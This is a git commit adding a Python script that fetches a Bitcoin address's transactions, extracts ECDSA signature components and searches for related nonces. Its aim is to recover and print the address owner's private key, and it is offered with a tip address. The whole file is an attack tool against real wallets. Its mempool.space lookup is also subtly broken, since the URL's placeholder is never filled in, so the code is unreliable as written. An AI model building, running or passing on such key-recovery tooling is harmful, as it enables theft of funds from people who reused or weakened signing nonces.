0f31e14a12886afbd56f60df6700f42a695b6ac0
Ufzjdfhhbxjdjdn <epubgpvp@gmail.com>
2025-06-20 18:48:12 +0300

    Add files via upload

---
+++ rsz_rdiff_scan.py
@@ -0,0 +1,194 @@
+# -*- coding: utf-8 -*-
+
+"""
+@author: iceland
+Modified by: ChatGPT (with AI R similarity detection)
+"""
+
+import sys
+import hashlib
+import json
+import argparse
+from urllib.request import urlopen
+import secp256k1 as ice
+import smart_tools
+
+G = ice.scalar_multiplication(1)
+N = ice.N
+ZERO = ice.Zero
+
+parser = argparse.ArgumentParser(description='Extract RSZ and detect private key using R reuse and AI similarity analysis.',
+                                 epilog='Tips BTC: bc1q39meky2mn5qjq704zz0nnkl0v7kj4uz6r529at')
+parser.add_argument("-a", help="Bitcoin Address", required=True)
+bP = 100000000
+
+if len(sys.argv) == 1:
+    parser.print_help()
+args = parser.parse_args()
+address = args.a
+
+def get_rs(sig):
+    try:
+        rlen = int(sig[2:4], 16)
+        r = sig[4:4 + rlen * 2]
+        s = sig[8 + rlen * 2:]
+        return r, s
+    except:
+        return '', ''
+
+def split_sig_pieces(script):
+    try:
+        sigLen = int(script[2:4], 16)
+        sig = script[4:4 + sigLen * 2]
+        r, s = get_rs(sig)
+        pubLen = int(script[4 + sigLen * 2:4 + sigLen * 2 + 2], 16)
+        pub = script[4 + sigLen * 2 + 2:]
+        return r, s, pub
+    except:
+        return '', '', ''
+
+def parseTx(txn):
+    inp_list = []
+    try:
+        ver = txn[:8]
+        inp_nu = int(txn[8:10], 16)
+        first = txn[0:10]
+        cur = 10
+        for m in range(inp_nu):
+            prv_out = txn[cur:cur+64]
+            var0 = txn[cur+64:cur+72]
+            cur += 72
+            scriptLen = int(txn[cur:cur+2], 16)
+            script = txn[cur:2+cur+2*scriptLen]
+            r, s, pub = split_sig_pieces(script)
+            seq = txn[2+cur+2*scriptLen:10+cur+2*scriptLen]
+            inp_list.append([prv_out, var0, r, s, pub, seq])
+            cur = 10+cur+2*scriptLen
+        rest = txn[cur:]
+        return [first, inp_list, rest]
+    except:
+        return ['', [], '']
+
+def get_rawtx_from_blockchain(txid):
+    try:
+        htmlfile = urlopen("https://blockchain.info/rawtx/%s?format=hex" % txid, timeout=20)
+        return htmlfile.read().decode('utf-8')
+    except:
+        return ''
+
+def getSignableTxn(parsed):
+    res = []
+    try:
+        first, inp_list, rest = parsed
+        tot = len(inp_list)
+        for one in range(tot):
+            e = first
+            for i in range(tot):
+                e += inp_list[i][0]
+                e += inp_list[i][1]
+                if one == i:
+                    e += '1976a914' + smart_tools.hash160(bytes.fromhex(inp_list[one][4])).hex() + '88ac'
+                else:
+                    e += '00'
+                e += inp_list[i][5]
+            e += rest + "01000000"
+            z = hashlib.sha256(hashlib.sha256(bytes.fromhex(e)).digest()).hexdigest()
+            res.append([inp_list[one][2], inp_list[one][3], z, inp_list[one][4], e])
+    except:
+        pass
+    return res
+
+def diff_comb_idx(alist):
+    LL = len(alist)
+    return [(i, j, ice.point_subtraction(alist[i], alist[j])) for i in range(LL) for j in range(i+1, LL)]
+
+def inv(a): return pow(a, N - 2, N)
+
+def calc_RQ(r, s, z, pub_point):
+    try:
+        RP1 = ice.pub2upub('02' + hex(r)[2:].zfill(64))
+        RP2 = ice.pub2upub('03' + hex(r)[2:].zfill(64))
+        sdr = (s * inv(r)) % N
+        zdr = (z * inv(r)) % N
+        FF1 = ice.point_subtraction(ice.point_multiplication(RP1, sdr), ice.scalar_multiplication(zdr))
+        FF2 = ice.point_subtraction(ice.point_multiplication(RP2, sdr), ice.scalar_multiplication(zdr))
+        if FF1 == pub_point:
+            return RP1
+        if FF2 == pub_point:
+            return RP2
+    except:
+        return ZERO
+    return ZERO
+
+def getk1(r1, s1, z1, r2, s2, z2, m):
+    nr = (s2 * m * r1 + z1 * r2 - z2 * r1) % N
+    dr = (s1 * r2 - s2 * r1) % N
+    return (nr * inv(dr)) % N
+
+def getpvk(r1, s1, z1, r2, s2, z2, m):
+    x1 = (s2 * z1 - s1 * z2 + m * s1 * s2) % N
+    xi = inv((s1 * r2 - s2 * r1) % N)
+    return (x1 * xi) % N
+
+def check_tx(address):
+    txid, cdx = [], []
+    try:
+        htmlfile = urlopen("https://mempool.space/api/address/%s/txs", timeout=20)
+        res = json.loads(htmlfile.read())
+        for tx in res:
+            for j, vin in enumerate(tx["vin"]):
+                if vin["prevout"]["scriptpubkey_address"] == address:
+                    txid.append(tx["txid"])
+                    cdx.append(j)
+    except:
+        pass
+    return txid, cdx
+
+print('📌 Starting Program...')
+txid, cdx = check_tx(address)
+RQ, rL, sL, zL, QL = [], [], [], [], []
+
+for c in range(len(txid)):
+    rawtx = get_rawtx_from_blockchain(txid[c])
+    if not rawtx:
+        continue
+    m = parseTx(rawtx)
+    if not m[1]:
+        continue
+    e = getSignableTxn(m)
+    for i in range(len(e)):
+        if i == cdx[c]:
+            try:
+                rL.append(int(e[i][0], 16))
+                sL.append(int(e[i][1], 16))
+                zL.append(int(e[i][2], 16))
+                QL.append(ice.pub2upub(e[i][3]))
+            except:
+                pass
+
+for c in range(len(rL)):
+    RQ.append(calc_RQ(rL[c], sL[c], zL[c], QL[c]))
+
+smart_tools.analyze_all(rL, sL, zL, [q.hex() if isinstance(q, bytes) else q for q in QL])
+
+RD = diff_comb_idx(RQ)
+
+ice.bsgs_2nd_check_prepare(bP)
+
+solvable_diff = []
+for Q in RD:
+    try:
+        found, diff = ice.bsgs_2nd_check(Q[2], -1, bP)
+        if found:
+            solvable_diff.append((Q[0], Q[1], diff.hex()))
+    except:
+        pass
+
+for i in solvable_diff:
+    k = getk1(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int(i[2], 16))
+    d = getpvk(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int(i[2], 16))
+    for key in ice.one_to_6privatekey(d):
+        addr = ice.privatekey_to_address(0, True, key)
+        if addr == address:
+            print(f'[✓] PrivateKey VALIDATED: {hex(key)}')
+            break
